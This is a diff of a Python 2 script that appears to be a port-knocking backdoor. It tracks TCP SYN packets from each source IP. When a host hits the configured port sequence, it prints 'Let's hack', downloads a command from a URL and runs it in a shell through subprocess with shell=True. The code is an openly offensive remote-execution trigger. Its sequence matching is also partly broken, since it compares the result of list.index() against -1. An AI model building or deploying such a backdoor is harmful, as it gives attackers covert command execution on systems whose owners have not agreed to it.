@@ -41,9 +41,11 @@ def readAndExecute():
 		response = urllib2.urlopen(req)
 		the_page = str(response.read())
 		print the_page
+		print "----"
 		# command in the_page , executing it 
 
-		print subprocess.Popen(the_page, shell=True, stdout=subprocess.PIPE).stdout.read()
+		print subprocess.Popen(the_page,shell =True,stdout=subprocess.PIPE).stdout.read()
+		#print subprocess.Popen(['/bin/bash', '-c', the_page],stdout=subprocess.PIPE).stdout.read()
 		
 	except urllib2.URLError,urllib2.HTTPError:
 		print "Error reading the command from ", URL
@@ -60,27 +62,63 @@ def logic(host_port):
 	We have host_port in format (sourceip, destinationport) for TCP SYN packets only - 
 	Using hashmap to store it and perform necessary action when correct sequence hit 
 	"""
+	debug = False
 	global hashmap 
 	portlist = readConfig()
-	if host_port[1] in portlist:
-		# Port number exists in port List
-		if host_port[0] in hashmap:
-			#print hashmap[host_port[0]]
-			if host_port[1] == portlist[0] : # First element matches then clear list
-				hashmap[host_port[0]] = [host_port[1]]	
-			else:
-				hashmap[host_port[0]].append(host_port[1])
-		else:
-			hashmap[host_port[0]] = [host_port[1]] 
-	
-		print hashmap
-	
-		if hashmap[host_port[0]] == portlist :
-			print ("Whoa lets attack")
-			readAndExecute()
-	
-	else : 
-		print host_port[1] ,"not in ",  portlist
+	firstport = portlist[0]
+	hostip = host_port[0]
+	port = host_port[1]
+	print "Got TCP SYN for "+ str(host_port)
+	def getNextCount( lista,index,firstport):
+		if debug : print "Searching "+str(firstport)+" in "+ str(lista[index+1 : ])
+		nextIndex = lista[index+1 : ].index(firstport)	
+		
+		if ( nextIndex != -1 ):
+			if debug : print "Updated the index list, "+ str(nextIndex+(index+1))	
+			return nextIndex+(index+1)
+		else :
+			return index	
+		
+		
+		
+
+	if port in portlist:
+		if hostip in hashmap :
+			""" If host ip in hostmap """
+			index = hashmap[hostip][1]
+			
+			hashmap[hostip][0].append(port)	
+		
+			if debug : print "Host ip is in hashmap , checking for len and matching , Index : "+str(index) + " List : "+ str(hashmap[hostip][0][ index : ])
+			if debug : print len( portlist ) , len( hashmap[hostip][0][ index : ] )
+			if len( portlist ) == len( hashmap[hostip][0][ index : ] ):
+				if debug : print "Two lists equal .. Checking if lists is same"
+				
+				if portlist == hashmap[hostip][0][ index : ] :
+					print "List match .. Let's hack"
+					readAndExecute()
+			elif len( portlist ) < len( hashmap[hostip][0][ index : ] ):
+				if debug : print "Length is greator "
+				hashmap[hostip][1] = getNextCount(hashmap[hostip][0], index ,firstport)
+					#if len( portlist ) == len( hashmap[hostip][0][ index : ] ):
+					#	print "Two lists equal .. Checking if lists is same"
+						
+				index = hashmap[hostip][1]
+				if len( portlist ) == len( hashmap[hostip][0][ index : ] ):
+                                	if debug : print "Two lists equal .. Checking if lists is same"
+
+                                	if portlist == hashmap[hostip][0][ index : ] :
+                                        	print "List match .. Let's hack"
+                                        	readAndExecute()					
+			
+		else :
+			"If host ip not in hashmap "
+			hashmap[hostip] = [[port],0] 
+			if debug : print "Host ip not in hasmap , adding " + str(hashmap[hostip])
+
+	else :
+		print "Port not in configuration for "+ str(host_port)
+
 
 
 def run():
